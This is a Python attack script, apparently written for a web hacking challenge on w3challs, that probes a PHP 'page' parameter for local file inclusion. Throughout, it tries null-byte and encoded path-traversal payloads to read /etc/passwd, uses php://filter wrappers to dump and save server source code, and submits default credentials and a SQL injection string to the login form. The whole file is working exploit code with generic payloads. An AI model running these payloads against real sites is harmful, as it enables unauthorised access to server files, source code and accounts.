#!/usr/bin/env python3
import requests
import base64
import re
from urllib.parse import quote, unquote

session = requests.Session()
base = "https://vip.hax.w3challs.com/"

# Testing path restriction bypass with null bytes
test_files = [
    "login",
    "member", 
    "admin",
    "config",
    "database",
    "db",
    "secret",
    "flag",
    "users",
    "auth",
    "session",
    "include",
    "common",
    "functions",
    "init"
]

print("[*] Testing null byte injection variations...")
for file in test_files:
    variations = [
        f"{file}%00",
        f"{file}\x00",
        f"{file}%2500",
        f"../{file}%00",
        f"../includes/{file}%00",
        f"includes/{file}%00",
        f"files/{file}%00",
        f"../files/{file}%00",
        f"{file}%00.php",
        f"{file}%00.html",
        f"{file}%00.txt",
        f"{file}.php%00",
        f"{file}.inc%00"
    ]
    
    for var in variations:
        url = f"{base}index.php?page={var}"
        r = session.get(url)
        
        # Get baseline for comparison
        baseline = session.get(f"{base}index.php?page=nonexistentfile123").text
        
        if len(r.text) != len(baseline):
            # Check for PHP code or interesting content
            if '<?php' in r.text or 'password' in r.text.lower() or 'sql' in r.text.lower():
                print(f"[!] PHP/Sensitive content found: {var}")
                print(f"    First 200 chars: {r.text[:200]}")
            elif '<form' in r.text and 'password' in r.text:
                print(f"[+] Form found: {var}")
            elif r.text.count('<') > baseline.count('<'):
                print(f"[+] Different HTML structure: {var}")
                
# Try to read source code with wrappers
print("\n[*] Attempting source code extraction...")

wrapper_targets = [
    ("php://filter/convert.base64-encode/resource=", ["index", "login", "member", "admin", "config"]),
    ("php://filter/read=string.rot13/resource=", ["index", "login", "member"]),
    ("php://filter/zlib.deflate/resource=", ["index", "login"]),
]

for wrapper, targets in wrapper_targets:
    for target in targets:
        url = f"{base}index.php?page={wrapper}{target}"
        r = session.get(url)
        
        # Look for encoded content
        if wrapper == "php://filter/convert.base64-encode/resource=":
            # Extract potential base64
            matches = re.findall(r'[A-Za-z0-9+/]{100,}={0,2}', r.text)
            for match in matches:
                try:
                    decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                    if '<?php' in decoded:
                        print(f"[!!!] SOURCE CODE EXTRACTED for {target}:")
                        print(decoded[:500])
                        # Save it
                        with open(f"/workspace/{target}_source.php", "w") as f:
                            f.write(decoded)
                except:
                    pass

# Test for second step authentication mentioned in login page
print("\n[*] Testing two-step authentication...")

# First, try to get a valid session
login_data = [
    {'login': "admin", 'pass': "admin"},
    {'login': "LuG[3]R", 'pass': "password"},
    {'login': "test", 'pass': "test"},
    {'login': "' or '1'='1", 'pass': "' or '1'='1"},
]

for data in login_data:
    r = session.post(f"{base}index.php?page=login", data=data)
    
    # Check cookies
    if session.cookies:
        print(f"[*] Cookies after login attempt with {data['login']}: {dict(session.cookies)}")
    
    # Check for redirect or different content
    if 'location' in r.headers:
        print(f"[!] Redirect detected: {r.headers['location']}")
    
    # Try to access member area with session
    member_test = session.get(f"{base}index.php?page=member")
    if 'welcome' in member_test.text.lower() or len(member_test.text) > 2000:
        print(f"[!] Possible member access with: {data}")

# Directory traversal with encoding tricks
print("\n[*] Testing encoding bypasses...")

encodings = [
    "../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd"
]

for enc in encodings:
    url = f"{base}index.php?page={enc}"
    r = session.get(url)
    if 'root:' in r.text:
        print(f"[!!!] LFI SUCCESS: {enc}")
        print(r.text[:500])